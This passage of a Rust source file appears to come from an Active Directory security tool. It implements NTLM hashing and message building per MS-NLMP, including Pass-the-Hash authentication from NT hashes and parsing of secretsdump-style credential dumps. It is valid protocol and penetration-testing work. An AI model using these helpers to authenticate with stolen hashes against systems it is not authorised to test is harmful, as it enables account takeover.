//! NTLM hash computation and authentication helpers.
//!
//! Implements NT hash (MD4), NTLMv2 hash (HMAC-MD5), NTLMv2 challenge-response,
//! and Pass-the-Hash support for Active Directory authentication.
//!
//! Reference: [MS-NLMP] -- Microsoft NT LAN Manager Authentication Protocol

use crate::error::{OverthroneError, Result};
use digest::Digest;
use hmac::{Hmac, Mac};
use md4::Md4;
use md5::Md5;

type HmacMd5 = Hmac<Md5>;

// ===========================================================
// Negotiate flags (MS-NLMP 2.2.2.5)
// ===========================================================

/// Requests Unicode encoding for the payload strings.
pub const NTLMSSP_NEGOTIATE_UNICODE: u32 = 0x0000_0001;
/// Requests that the server supply a TargetName in the CHALLENGE.
pub const NTLMSSP_REQUEST_TARGET: u32 = 0x0000_0004;
/// Requests per-message signing (integrity).
pub const NTLMSSP_NEGOTIATE_SIGN: u32 = 0x0000_0010;
/// Requests message confidentiality (RC4 sealing of the payload).
pub const NTLMSSP_NEGOTIATE_SEAL: u32 = 0x0000_0020;
/// NTLM authentication.
pub const NTLMSSP_NEGOTIATE_NTLM: u32 = 0x0000_0200;
/// Forces a signature block on every message.
pub const NTLMSSP_NEGOTIATE_ALWAYS_SIGN: u32 = 0x0000_8000;
/// NTLM2 session security (a.k.a. extended session security).
pub const NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY: u32 = 0x0008_0000;
/// The CHALLENGE carries the TargetInfo AV_PAIR list.
pub const NTLMSSP_NEGOTIATE_TARGET_INFO: u32 = 0x0080_0000;
/// The optional 8-byte Version field is present in all three messages.
pub const NTLMSSP_NEGOTIATE_VERSION: u32 = 0x0200_0000;
/// 128-bit session keys.
pub const NTLMSSP_NEGOTIATE_128: u32 = 0x2000_0000;
/// Explicit key exchange: the client picks ExportedSessionKey and ships it
/// RC4-encrypted in the AUTHENTICATE message (MS-NLMP 3.1.5.2).
pub const NTLMSSP_NEGOTIATE_KEY_EXCH: u32 = 0x4000_0000;
/// 56-bit session keys.
pub const NTLMSSP_NEGOTIATE_56: u32 = 0x8000_0000;
/// The client
/// supplied an OEM domain name in the NEGOTIATE message.
pub const NTLMSSP_NEGOTIATE_OEM_DOMAIN_SUPPLIED: u32 = 0x0000_1000;

/// The flags a Windows client sends when it wants integrity + confidentiality.
/// This is the same set impacket/NXC use for `getNTLMSSPType1(signingRequired=True)`.
pub const NTLMSSP_CLIENT_FLAGS: u32 = NTLMSSP_NEGOTIATE_UNICODE
    | NTLMSSP_REQUEST_TARGET
    | NTLMSSP_NEGOTIATE_SIGN
    | NTLMSSP_NEGOTIATE_SEAL
    | NTLMSSP_NEGOTIATE_NTLM
    | NTLMSSP_NEGOTIATE_ALWAYS_SIGN
    | NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY
    | NTLMSSP_NEGOTIATE_TARGET_INFO
    | NTLMSSP_NEGOTIATE_128
    | NTLMSSP_NEGOTIATE_KEY_EXCH
    | NTLMSSP_NEGOTIATE_56;

// ===========================================================
// AV_PAIR identifiers (MS-NLMP 2.2.2.1)
// ===========================================================

/// MsvAvEOL -- end of the AV_PAIR list.
pub const MSV_AV_EOL: u16 = 0x0000;
/// MsvAvNbComputerName -- the server's NetBIOS name.
pub const MSV_AV_NB_COMPUTER_NAME: u16 = 0x0001;
/// MsvAvNbDomainName -- the NetBIOS domain name (this is the *authoritative*
/// domain string for the NTLMv2 key derivation, see `ntlmv2_hash`).
pub const MSV_AV_NB_DOMAIN_NAME: u16 = 0x0002;
/// MsvAvDnsComputerName -- the server's FQDN.
pub const MSV_AV_DNS_COMPUTER_NAME: u16 = 0x0003;
/// MsvAvDnsDomainName -- the DNS domain name.
pub const MSV_AV_DNS_DOMAIN_NAME: u16 = 0x0004;
/// MsvAvDnsTreeName -- the DNS forest name.
pub const MSV_AV_DNS_TREE_NAME: u16 = 0x0005;
/// MsvAvFlags -- client/server capability flags.
pub const MSV_AV_FLAGS: u16 = 0x0006;
/// MsvAvTimestamp -- the server's FILETIME, echoed back by the client.
pub const MSV_AV_TIMESTAMP: u16 = 0x0007;
/// MsvAvSingleHost -- restrictions imposed by the client.
pub const MSV_AV_SINGLE_HOST: u16 = 0x0008;
/// MsvAvTargetName -- the SPN the client believes it is talking to.
/// Windows rejects the logon (or logs an event) when the target enforces
/// "Restrict NTLM: Add server SPN" and this AV_PAIR is absent or wrong.
pub const MSV_AV_TARGET_NAME: u16 = 0x0009;
/// MsvAvChannelBindings -- RFC 5929 channel binding hash (EPA).
pub const MSV_AV_CHANNEL_BINDINGS: u16 = 0x000A;
/// MsvAvFlags bit 0: a MIC is present in the AUTHENTICATE message.
pub const MSV_AV_FLAGS_MIC_PRESENT: u32 = 0x0000_0001;

// ===========================================================
// AV_PAIR helpers
// ===========================================================

/// Decode a TargetInfo blob into its AV_PAIR list.
pub fn parse_av_pairs(target_info: &[u8]) -> Vec<(u16, Vec<u8>)> {
    let mut pairs = Vec::new();
    let mut pos = 0usize;
    while pos + 4 <= target_info.len() {
        let av_id = u16::from_le_bytes([target_info[pos], target_info[pos + 1]]);
        let av_len = u16::from_le_bytes([target_info[pos + 2], target_info[pos + 3]]) as usize;
        pos += 4;
        if av_id == MSV_AV_EOL {
            break;
        }
        if pos + av_len > target_info.len() {
            break;
        }
        pairs.push((av_id, target_info[pos..pos + av_len].to_vec()));
        pos += av_len;
    }
    pairs
}

/// Serialise an AV_PAIR list, always terminating with MsvAvEOL.
pub fn serialize_av_pairs(pairs: &[(u16, Vec<u8>)]) -> Vec<u8> {
    let mut out = Vec::new();
    for (id, value) in pairs {
        if *id == MSV_AV_EOL {
            continue;
        }
        let len = value.len().min(u16::MAX as usize) as u16;
        out.extend_from_slice(&id.to_le_bytes());
        out.extend_from_slice(&len.to_le_bytes());
        out.extend_from_slice(&value[..len as usize]);
    }
    out.extend_from_slice(&MSV_AV_EOL.to_le_bytes());
    out.extend_from_slice(&0u16.to_le_bytes());
    out
}

/// Insert or replace an AV_PAIR in a list (preserving the original ordering).
pub fn set_av_pair(pairs: &mut Vec<(u16, Vec<u8>)>, id: u16, value: &[u8]) {
    if let Some(slot) = pairs.iter_mut().find(|(k, _)| *k == id) {
        slot.1 = value.to_vec();
    } else {
        pairs.push((id, value.to_vec()));
    }
}

/// Look up a single AV_PAIR value.
pub fn get_av_pair(target_info: &[u8], id: u16) -> Option<Vec<u8>> {
    parse_av_pairs(target_info)
        .into_iter()
        .find(|(k, _)| *k == id)
        .map(|(_, v)| v)
}

// ===========================================================
// NT Hash -- MD4(UTF-16LE(password))
// ===========================================================

/// Compute the NT hash of a password: MD4(UTF-16LE(password))
/// This is the primary credential hash stored in the SAM database
/// and Active Directory. It is "password equivalent" -- knowing this
/// hash is sufficient to authenticate without the plaintext password.
pub fn nt_hash(password: &str) -> Vec<u8> {
    let utf16le: Vec<u8> = password
        .encode_utf16()
        .flat_map(|c| c.to_le_bytes())
        .collect();
    let mut hasher = Md4::new();
    hasher.update(&utf16le);
    hasher.finalize().to_vec()
}

/// Compute NT hash and return as lowercase hex string
pub fn nt_hash_hex(password: &str) -> String {
    hex::encode(nt_hash(password))
}

// ===========================================================
// NTLMv2 Hash -- HMAC-MD5(NT_HASH, UPPER(user) + UPPER(domain))
// ===========================================================

/// Compute the NTLMv2 hash (also called the "NTLMv2 OWF").
///
/// Formula: `HMAC-MD5(NTOWFv1, UTF-16LE(UPPER(username) + domain))`.
///
/// Only the **user name** is upper-cased. The user domain is used exactly as
/// supplied -- [MS-NLMP 3.3.2] defines `UserDom` as the value from the
/// CHALLENGE's `MsvAvNbDomainName` (`NetBIOS` name, upper case by convention)
/// or, for local accounts, the server's computer name. Upper-casing it here
/// would silently produce a different key whenever the DC reports a domain
/// whose case differs from what the caller passed (e.g. `LAINOSCP` vs
/// `lainoscp.local`), which shows up as rc=49 invalidCredentials.
///
/// Reference: [MS-NLMP] Section 3.3.2
pub fn ntlmv2_hash(nt_hash: &[u8], username: &str, domain: &str) -> Vec<u8> {
    let identity = format!("{}{}", username.to_uppercase(), domain);
    let identity_utf16: Vec<u8> = identity
        .encode_utf16()
        .flat_map(|c| c.to_le_bytes())
        .collect();

    let mut mac = HmacMd5::new_from_slice(nt_hash).expect("HMAC-MD5 accepts any key length");
    mac.update(&identity_utf16);
    mac.finalize().into_bytes().to_vec()
}

/// Convenience: compute NTLMv2 hash directly from a plaintext password.
pub fn ntlmv2_hash_from_password(password: &str, username: &str, domain: &str) -> Vec<u8> {
    let nt = nt_hash(password);
    ntlmv2_hash(&nt, username, domain)
}

// ===========================================================
// NTLMv2 Response -- for challenge-response authentication
// ===========================================================

/// Compute the NTLMv2 response for a given server challenge.
/// Formula: HMAC-MD5(NTLMv2_HASH, server_challenge + client_blob)
///          concatenated with the client_blob.
/// The `client_blob` (NTLMv2_CLIENT_CHALLENGE) contains a timestamp,
/// client nonce, and target info from the server's CHALLENGE_MESSAGE.
/// Reference: [MS-NLMP] Section 3.3.2
pub fn ntlmv2_response(
    ntlmv2_hash: &[u8],
    server_challenge: &[u8; 8],
    client_blob: &[u8],
) -> Vec<u8> {
    // NTProofStr = HMAC-MD5(NTLMv2Hash, ServerChallenge + ClientBlob)
    let mut mac = HmacMd5::new_from_slice(ntlmv2_hash).expect("HMAC-MD5 accepts any key length");
    mac.update(server_challenge);
    mac.update(client_blob);
    let nt_proof_str = mac.finalize().into_bytes();

    // Response = NTProofStr (16 bytes) + ClientBlob
    let mut response = nt_proof_str.to_vec();
    response.extend_from_slice(client_blob);
    response
}

/// Build a minimal NTLMv2 client blob (NTLMv2_CLIENT_CHALLENGE).
/// Layout (28+ bytes):
///   - RespType:    u8  = 0x01
///   - HiRespType:  u8  = 0x01
///   - Reserved1:   u16 = 0
///   - Reserved2:   u32 = 0
///   - TimeStamp:   u64 (Windows FILETIME, 100ns ticks since 1601-01-01)
///   - ClientChallenge: 8 bytes (random)
///   - Reserved3:   u32 = 0
///   - AvPairs:     target_info bytes from CHALLENGE_MESSAGE
///
/// Reference: [MS-NLMP] Section 2.2.2.7
pub fn build_ntlmv2_client_blob(
    timestamp: u64,
    client_challenge: &[u8; 8],
    target_info: &[u8],
) -> Vec<u8> {
    let mut blob = Vec::with_capacity(28 + target_info.len());

    blob.push(0x01); // RespType
    blob.push(0x01); // HiRespType
    blob.extend_from_slice(&0u16.to_le_bytes()); // Reserved1
    blob.extend_from_slice(&0u32.to_le_bytes()); // Reserved2
    blob.extend_from_slice(&timestamp.to_le_bytes()); // TimeStamp
    blob.extend_from_slice(client_challenge); // ChallengeFromClient
    blob.extend_from_slice(&0u32.to_le_bytes()); // Reserved3
    blob.extend_from_slice(target_info); // AvPairs

    blob
}

/// Get the current time as a Windows FILETIME (100ns ticks since 1601-01-01).
/// The offset between Unix epoch (1970) and Windows epoch (1601) is
/// 116444736000000000 ticks (100ns units).
pub fn windows_filetime_now() -> u64 {
    const EPOCH_DIFF: u64 = 116_444_736_000_000_000;
    let unix_nanos = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap_or_default()
        .as_nanos() as u64;
    // Convert nanoseconds to 100-nanosecond intervals and add epoch offset
    (unix_nanos / 100) + EPOCH_DIFF
}

// ===========================================================
// NTLMv2 Session Key
// ===========================================================

/// Compute the NTLMv2 session base key.
/// Formula: HMAC-MD5(NTLMv2_HASH, NTProofStr)
/// The NTProofStr is the first 16 bytes of the NTLMv2 response.
/// This session key is used for signing and sealing messages.
/// Reference: [MS-NLMP] Section 3.3.2
pub fn ntlmv2_session_base_key(ntlmv2_hash: &[u8], nt_proof_str: &[u8]) -> Vec<u8> {
    let mut mac = HmacMd5::new_from_slice(ntlmv2_hash).expect("HMAC-MD5 accepts any key length");
    mac.update(nt_proof_str);
    mac.finalize().into_bytes().to_vec()
}

// ===========================================================
// LMv2 Response (companion to NTLMv2)
// ===========================================================

/// Compute the LMv2 response.
/// Formula: HMAC-MD5(NTLMv2_HASH, server_challenge + client_challenge)
///          concatenated with client_challenge.
/// Reference: [MS-NLMP] Section 3.3.2
pub fn lmv2_response(
    ntlmv2_hash: &[u8],
    server_challenge: &[u8; 8],
    client_challenge: &[u8; 8],
) -> Vec<u8> {
    let mut mac = HmacMd5::new_from_slice(ntlmv2_hash).expect("HMAC-MD5 accepts any key length");
    mac.update(server_challenge);
    mac.update(client_challenge);
    let proof = mac.finalize().into_bytes();

    // Response = proof (16 bytes) + client_challenge (8 bytes) = 24 bytes
    let mut response = proof.to_vec();
    response.extend_from_slice(client_challenge);
    response
}

// ===========================================================
// Hash Parsing & Utilities
// ===========================================================

/// Parse an NTLM hash string in `LMHASH:NTHASH` or bare `NTHASH` format.
/// Returns the 16-byte NT hash. Accepts secretsdump/hashdump output format.
pub fn parse_ntlm_hash(hash_str: &str) -> Result<Vec<u8>> {
    let nt_part = if hash_str.contains(':') {
        // Format: LMHASH:NTHASH -- take the NT part
        hash_str
            .split(':')
            .nth(1)
            .ok_or_else(|| OverthroneError::InvalidHash(hash_str.to_string()))?
    } else {
        hash_str
    };

    // Validate: must be 32 hex chars (16 bytes)
    if nt_part.len() != 32 {
        return Err(OverthroneError::InvalidHash(format!(
            "Expected 32 hex chars, got {}",
            nt_part.len()
        )));
    }

    hex::decode(nt_part).map_err(|e| OverthroneError::InvalidHash(format!("Invalid hex: {e}")))
}

/// Parse a full secretsdump-style hash line:
/// `username:rid:lm_hash:nt_hash:::`
/// Returns (username, rid, nt_hash_bytes)
pub fn parse_secretsdump_line(line: &str) -> Result<(String, u32, Vec<u8>)> {
    let parts: Vec<&str> = line.split(':').collect();
    if parts.len() < 4 {
        return Err(OverthroneError::InvalidHash(format!(
            "Expected secretsdump format 'user:rid:lm:nt', got: {line}"
        )));
    }

    let username = parts[0].to_string();
    let rid: u32 = parts[1].parse().map_err(|_| {
        OverthroneError::InvalidHash(format!("Invalid RID '{}' in: {line}", parts[1]))
    })?;
    let nt_hash = hex::decode(parts[3])
        .map_err(|e| OverthroneError::InvalidHash(format!("Invalid NT hash hex: {e}")))?;

    if nt_hash.len() != 16 {
        return Err(OverthroneError::InvalidHash(format!(
            "NT hash must be 16 bytes, got {}",
            nt_hash.len()
        )));
    }

    Ok((username, rid, nt_hash))
}

/// Constant for the "empty" LM hash (password blank or LM hashing disabled).
/// This appears in virtually all modern Windows environments since
/// LM hashes are disabled by default on Vista+.
pub fn lm_hash_empty() -> Vec<u8> {
    hex::decode("aad3b435b51404eeaad3b435b51404ee")
        .expect("compile-time hex constant for empty LM hash")
}

/// Check if an NT hash represents an empty/blank password.
pub fn is_empty_nt_hash(hash: &[u8]) -> bool {
    // NT hash of "" = 31d6cfe0d16ae931b73c59d7e0c089c0
    let empty_nt = hex::decode("31d6cfe0d16ae931b73c59d7e0c089c0")
        .expect("compile-time hex constant for empty NT hash");
    hash == empty_nt.as_slice()
}

/// Check if an LM hash is the "disabled/empty" sentinel value.
pub fn is_empty_lm_hash(hash: &[u8]) -> bool {
    let empty_lm = hex::decode("aad3b435b51404eeaad3b435b51404ee")
        .expect("compile-time hex constant for empty LM hash");
    hash == empty_lm.as_slice()
}

// ===========================================================
// NTLM Message Building (for authentication)
// ===========================================================

/// NTLM signature bytes
const NTLM_SIGNATURE: &[u8; 8] = b"NTLMSSP\x00";

/// NTLM message types
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum NtlmMessageType {
    /// `` variant
    Negotiate = 1,
    /// `` variant
    Challenge = 2,
    /// `` variant
    Authenticate = 3,
}

/// Parsed NTLM Challenge message
#[derive(Debug, Clone)]
pub struct NtlmChallengeMessage {
    /// Classification for this object.
    pub message_type: NtlmMessageType,
    /// Target server name
    pub target_name: Option<String>,
    /// NTLM challenge value
    pub challenge: [u8; 8],
    /// target info field
    pub target_info: Option<Vec<u8>>,
    /// flags field
    pub flags: u32,
}

/// NTLM message version emitted when `NEGOTIATE_VERSION` is set
/// (Windows 10 21H1, 10.0.19043, revision 15).
const NTLM_VERSION: [u8; 8] = [0x0a, 0x00, 0x43, 0x1d, 0x00, 0x00, 0x00, 0x0f];

/// Build NTLM Type 1 (NEGOTIATE) message.
///
/// This message is sent from client to server to initiate NTLM authentication.
/// The flags are the full Windows client set (`NTLMSSP_CLIENT_FLAGS`), i.e.
/// signing, sealing and key exchange are requested -- which is exactly what
/// LDAP signing and SMB2 signing need.
///
/// The wire layout is fixed by [MS-NLMP 2.2.1.1]; `NegotiateFlags` comes
/// immediately after `MessageType`, *before* the two `SecBuffer` fields. The
/// optional DomainName field is only emitted when `domain` is non-empty, and
/// the payload offsets account for the (optional) Version field so the two
/// never overlap:
///
/// ```text
/// [0..8)   Signature        [16..18) DomainName.Len
/// [8..12)  MessageType      [18..20) DomainName.MaxLen
/// [12..16) NegotiateFlags   [20..24) DomainName.BufferOffset
/// [24..26) Workstation.Len  [26..28) Workstation.MaxLen
/// [28..32) Workstation.BufferOffset
/// [32..40) Version (optional)
/// [40..)   Payload (DomainName)
/// ```
///
/// Ordering matters: Windows' AcceptSecurityContext reads the flag word from
/// offset 12 unconditionally. Emitting the `SecBuffer` fields first makes it
/// parse them as flags and reject the context with `data 57`
/// (ERROR_INVALID_PARAMETER) -- which is exactly what an LDAP SASL bind
/// surfaced as `rc=49`.
pub fn build_negotiate_message(domain: &str) -> Vec<u8> {
    build_negotiate_message_ex(domain, false)
}

/// Build a NTLM Type 1 (NEGOTIATE) message, optionally advertising
/// `NEGOTIATE_VERSION`.
///
/// Advertising a version obliges the client to also send a MIC in the
/// AUTHENTICATE message ([MS-NLMP 2.2.2.1] Version/MIC presence rules); callers
/// that set `include_version` must therefore build the Type 3 with
/// [`build_authenticate_message_full`] and pass the raw NEGOTIATE/CHALLENGE
/// bytes so the MIC can be computed.
pub fn build_negotiate_message_ex(domain: &str, include_version: bool) -> Vec<u8> {
    let mut flags = NTLMSSP_CLIENT_FLAGS;
    if include_version {
        flags |= NTLMSSP_NEGOTIATE_VERSION;
    }
    build_negotiate_message_with_flags(domain, flags)
}

/// Build a NTLM Type 1 (NEGOTIATE) message with an explicit flag set.
///
/// Exposed so callers (and tests) can probe exactly which capabilities a server
/// accepts. The `NEGOTIATE_VERSION` bit and the payload offsets are kept
/// consistent automatically.
pub fn build_negotiate_message_with_flags(domain: &str, flags: u32) -> Vec<u8> {
    let include_version = flags & NTLMSSP_NEGOTIATE_VERSION != 0;

    // The DomainName field is only emitted when the caller asks for it. Note it
    // is UTF-16LE, so `NEGOTIATE_OEM_DOMAIN_SUPPLIED` is deliberately never set:
    // that flag tells the server to read the field as the OEM code page, and a
    // mismatch makes Windows fail the context with ERROR_INVALID_PARAMETER.
    let domain_utf16: Vec<u8> = domain
        .encode_utf16()
        .flat_map(|c| c.to_le_bytes())
        .collect();

    // Payload starts after the fixed header plus the optional Version field.
    let header_len: u32 = if include_version { 40 } else { 32 };
    let domain_offset: u32 = if domain_utf16.is_empty() {
        0
    } else {
        header_len
    };
    // The length fields count payload bytes and exclude any NUL terminator --
    // the payload itself carries no terminator (matches impacket/Windows).
    let domain_len: u16 = domain_utf16.len() as u16;

    let mut msg = Vec::with_capacity(header_len as usize + domain_utf16.len());

    // Signature + message type
    msg.extend_from_slice(NTLM_SIGNATURE);
    msg.extend_from_slice(&1u32.to_le_bytes());

    // NegotiateFlags -- MUST sit at offset 12 (MS-NLMP 2.2.1.1).
    msg.extend_from_slice(&flags.to_le_bytes());

    // DomainNameFields (Len, MaxLen, BufferOffset)
    msg.extend_from_slice(&domain_len.to_le_bytes());
    msg.extend_from_slice(&domain_len.to_le_bytes());
    msg.extend_from_slice(&domain_offset.to_le_bytes());

    // WorkstationFields -- Windows clients never populate this in a Type 1
    msg.extend_from_slice(&0u16.to_le_bytes());
    msg.extend_from_slice(&0u16.to_le_bytes());
    msg.extend_from_slice(&0u32.to_le_bytes());

    // Optional Version -- must sit at offset 32, *before* the payload.
    if include_version {
        msg.extend_from_slice(&NTLM_VERSION);
    }

    msg.extend_from_slice(&domain_utf16);
    msg
}

/// Parse NTLM Type 2 (Challenge) message from server
pub fn parse_challenge_message(data: &[u8]) -> Result<NtlmChallengeMessage> {
    if data.len() < 48 {
        return Err(OverthroneError::Ntlm(format!(
            "NTLM Challenge (Type 2) too short: {} bytes (expected >=48)",
            data.len()
        )));
    }

    // Verify signature
    if &data[0..8] != NTLM_SIGNATURE {
        let first_bytes = &data[0..8.min(data.len())];
        return Err(OverthroneError::Ntlm(format!(
            "Invalid NTLM signature: expected 'NTLMSSP\\x00', got {:02x?}",
            first_bytes
        )));
    }

    // Check message type
    let msg_type = u32::from_le_bytes([data[8], data[9], data[10], data[11]]);
    if msg_type != 2 {
        return Err(OverthroneError::Ntlm(format!(
            "Expected Type 2 message, got {}",
            msg_type
        )));
    }

    // Extract target name
    let target_len = u16::from_le_bytes([data[12], data[13]]) as usize;
    let target_offset = u32::from_le_bytes([data[16], data[17], data[18], data[19]]) as usize;

    let target_name = if target_len > 0
        && target_offset + target_len <= data.len()
        && target_len.is_multiple_of(2)
    {
        Some(String::from_utf16_lossy(
            &data[target_offset..target_offset + target_len]
                .chunks(2)
                .map(|c| u16::from_le_bytes([c[0], c[1]]))
                .collect::<Vec<_>>(),
        ))
    } else {
        None
    };

    // Extract challenge (8 bytes at offset 24)
    let mut challenge = [0u8; 8];
    challenge.copy_from_slice(&data[24..32]);

    // Extract flags
    let flags = u32::from_le_bytes([data[20], data[21], data[22], data[23]]);

    // Extract target info if present
    let target_info = if data.len() >= 48 {
        let info_len = u16::from_le_bytes([data[40], data[41]]) as usize;
        let info_offset = u32::from_le_bytes([data[44], data[45], data[46], data[47]]) as usize;

        if info_len > 0 && info_offset + info_len <= data.len() {
            Some(data[info_offset..info_offset + info_len].to_vec())
        } else {
            None
        }
    } else {
        None
    };

    Ok(NtlmChallengeMessage {
        message_type: NtlmMessageType::Challenge,
        target_name,
        challenge,
        target_info,
        flags,
    })
}

/// Compute NTOWFv1 (same as NT hash)
pub fn ntowfv1(password: &str) -> Vec<u8> {
    nt_hash(password)
}

/// Compute HMAC-MD5(key, message) -- used for NTLM session key derivation
/// and LDAP message signing per MS-NLMP.
pub fn hmac_md5(key: &[u8], message: &[u8]) -> Vec<u8> {
    let mut mac = HmacMd5::new_from_slice(key).expect("HMAC-MD5 accepts any key length");
    mac.update(message);
    mac.finalize().into_bytes().to_vec()
}

/// Options controlling how an NTLMv2 AUTHENTICATE message is built.
#[derive(Debug, Clone, Default)]
pub struct NtlmAuthConfig<'a> {
    /// Service name used to synthesise the `MsvAvTargetName` AV_PAIR, e.g.
    /// `"ldap"` or `"cifs"`. Required when the target enforces SPN target name
    /// validation ("Restrict NTLM: Add server SPN"). The SPN is built from the
    /// `MsvAvDnsComputerName` the server itself supplied, so it always matches
    /// the DC's own `dnsHostName`.
    pub service: Option<&'a str>,
    /// Raw NEGOTIATE message -- required to compute the MIC.
    pub negotiate_message: Option<&'a [u8]>,
    /// Raw CHALLENGE message -- required to compute the MIC.
    pub challenge_message: Option<&'a [u8]>,
    /// Emit NEGOTIATE_VERSION (and therefore the MIC) in the AUTHENTICATE.
    pub include_version: bool,
    /// Perform the explicit key exchange: generate a random
    /// `ExportedSessionKey` and ship it RC4-encrypted in the
    /// EncryptedRandomSessionKey field ([MS-NLMP 3.1.5.2]).
    pub key_exchange: bool,
    /// Override the random `ChallengeFromClient` nonce. Used when the session
    /// key must be recomputed for an AUTHENTICATE message that is already on
    /// the wire.
    pub client_challenge: Option<[u8; 8]>,
}

/// A fully built NTLMv2 AUTHENTICATE message plus the keys it establishes.
#[derive(Debug, Clone)]
pub struct NtlmAuthenticate {
    /// The wire bytes of the Type 3 message.
    pub message: Vec<u8>,
    /// `ExportedSessionKey` -- THE key used for signing/sealing every
    /// subsequent message ([MS-NLMP 3.1.5.2]).
    pub exported_session_key: Vec<u8>,
    /// `KeyExchangeKey` (NTLMv2: identical to `SessionBaseKey`).
    pub key_exchange_key: Vec<u8>,
    /// Flags actually written into the AUTHENTICATE message.
    pub flags: u32,
    /// Flags the server returned in its CHALLENGE message.
    pub challenge_flags: u32,
    /// The random client nonce used in the NTLMv2 blob.
    pub client_challenge: [u8; 8],
    /// TargetInfo (AV_PAIRs) echoed back to the server.
    pub target_info: Vec<u8>,
    /// The MIC that was embedded, when one was computed.
    pub mic: Option<Vec<u8>>,
}

impl NtlmAuthenticate {
    /// True when the negotiated flags enable per-message signing.
    pub fn signing_enabled(&self) -> bool {
        self.flags & NTLMSSP_NEGOTIATE_SIGN != 0 || self.flags & NTLMSSP_NEGOTIATE_ALWAYS_SIGN != 0
    }

    /// True when the negotiated flags enable confidentiality (RC4 sealing).
    pub fn sealing_enabled(&self) -> bool {
        self.flags & NTLMSSP_NEGOTIATE_SEAL != 0
    }
}

/// Build NTLM Type 3 (AUTHENTICATE) message with the full Windows flag set.
///
/// The response flags are the intersection of what the client offered and what
/// the server echoed back, which is what Windows clients do. The session key is
/// returned so callers can sign/seal subsequent traffic.
pub fn build_authenticate_message(
    domain: &str,
    username: &str,
    nt_hash: &[u8],
    server_challenge: &[u8; 8],
    target_info: Option<&[u8]>,
    _password: Option<&str>,
) -> Vec<u8> {
    let cfg = NtlmAuthConfig {
        key_exchange: true,
        ..Default::default()
    };
    build_authenticate_message_full(
        domain,
        username,
        nt_hash,
        server_challenge,
        target_info,
        NTLMSSP_CLIENT_FLAGS,
        NTLMSSP_CLIENT_FLAGS,
        &cfg,
    )
    .message
}

/// Build an NTLMv2 AUTHENTICATE message, returning the wire bytes *and* the
/// session key needed to sign/seal the connection.
///
/// `negotiate_flags` are the flags sent in the NEGOTIATE message and
/// `challenge_flags` the flags the server returned; the resulting message
/// carries `negotiate_flags` with the capabilities the server did not offer
/// cleared (matching Windows and impacket).
#[allow(clippy::too_many_arguments)]
pub fn build_authenticate_message_full(
    domain: &str,
    username: &str,
    nt_hash: &[u8],
    server_challenge: &[u8; 8],
    target_info: Option<&[u8]>,
    negotiate_flags: u32,
    challenge_flags: u32,
    cfg: &NtlmAuthConfig<'_>,
) -> NtlmAuthenticate {
    let ntlmv2_h = ntlmv2_hash(nt_hash, username, domain);
    let client_challenge: [u8; 8] = cfg.client_challenge.unwrap_or_else(rand::random);
    let timestamp = windows_filetime_now();

    // -- TargetInfo: echo the server's AV_PAIRs back, refreshing the timestamp
    // and (optionally) adding MsvAvTargetName for SPN validation.
    let mut av_pairs = target_info.map(parse_av_pairs).unwrap_or_default();
    // Refresh the timestamp when we are synthesising a SPN (the server needs a
    // fresh one for replay protection), or when the server's TargetInfo already
    // carried one.
    if cfg.service.is_some() || av_pairs.iter().any(|(id, _)| *id == MSV_AV_TIMESTAMP) {
        set_av_pair(&mut av_pairs, MSV_AV_TIMESTAMP, &timestamp.to_le_bytes());
    }
    if let Some(service) = cfg.service
        && let Some(dns_host) = av_pairs
            .iter()
            .find(|(id, _)| *id == MSV_AV_DNS_COMPUTER_NAME)
            .map(|(_, v)| v.clone())
    {
        // "ldap/" + the server's own dnsHostName, as UTF-16LE.
        let mut spn: Vec<u8> = format!("{service}/")
            .encode_utf16()
            .flat_map(|c| c.to_le_bytes())
            .collect();
        spn.extend_from_slice(&dns_host);
        set_av_pair(&mut av_pairs, MSV_AV_TARGET_NAME, &spn);
    }
    let target_info_out = serialize_av_pairs(&av_pairs);

    // -- NTLMv2 challenge/response ([MS-NLMP 3.3.2])
    let client_blob = build_ntlmv2_client_blob(timestamp, &client_challenge, &target_info_out);
    let nt_response = ntlmv2_response(&ntlmv2_h, server_challenge, &client_blob);
    let lm_response = lmv2_response(&ntlmv2_h, server_challenge, &client_challenge);
    let session_base_key = ntlmv2_session_base_key(&ntlmv2_h, &nt_response[..16]);
    // KeyExchangeKey: for NTLMv2 this is the SessionBaseKey ([MS-NLMP 3.4.5.3]).
    let key_exchange_key = session_base_key.clone();

    // -- Response flags: everything we offered that the server echoed back.
    let mut response_flags = negotiate_flags;
    for bit in [
        NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY,
        NTLMSSP_NEGOTIATE_128,
        NTLMSSP_NEGOTIATE_KEY_EXCH,
        NTLMSSP_NEGOTIATE_SEAL,
        NTLMSSP_NEGOTIATE_SIGN,
        NTLMSSP_NEGOTIATE_ALWAYS_SIGN,
    ] {
        if challenge_flags & bit == 0 {
            response_flags &= !bit;
        }
    }

    // -- Session key ([MS-NLMP 3.1.5.2])
    let do_key_exchange = cfg.key_exchange && challenge_flags & NTLMSSP_NEGOTIATE_KEY_EXCH != 0;
    let (exported_session_key, encrypted_random_session_key) = if do_key_exchange {
        let rand_key: [u8; 16] = rand::random();
        let enc = crate::crypto::rc4_util::rc4_crypt(&key_exchange_key, &rand_key);
        (rand_key.to_vec(), Some(enc))
    } else {
        // No key exchange: the exported session key *is* the key exchange key.
        response_flags &= !NTLMSSP_NEGOTIATE_KEY_EXCH;
        (key_exchange_key.clone(), None)
    };

    // -- Layout. Base header 64 bytes; Version (+8) and MIC (+16) follow it,
    // both before the payload ([MS-NLMP 2.2.1.3]).
    let domain_utf16 = utf16le(domain);
    let username_utf16 = utf16le(username);
    let workstation_utf16 = utf16le("");
    let include_mic = cfg.include_version;
    let mut header_size = 64u32;
    if cfg.include_version {
        header_size += 8;
    }
    if include_mic {
        header_size += 16;
    }

    // Lengths in the Type 3 header are plain byte counts of the payload fields;
    // no NUL terminators are appended ([MS-NLMP 2.2.1.3]).
    let field_len = |bytes: &[u8]| -> u16 { bytes.len() as u16 };

    let lm_offset = header_size;
    let nt_offset = lm_offset + lm_response.len() as u32;
    let domain_offset = nt_offset + nt_response.len() as u32;
    let username_offset = domain_offset + domain_utf16.len() as u32;
    let workstation_offset = username_offset + username_utf16.len() as u32;
    let session_key_offset = workstation_offset + workstation_utf16.len() as u32;

    let mut msg = Vec::with_capacity(session_key_offset as usize + 16);
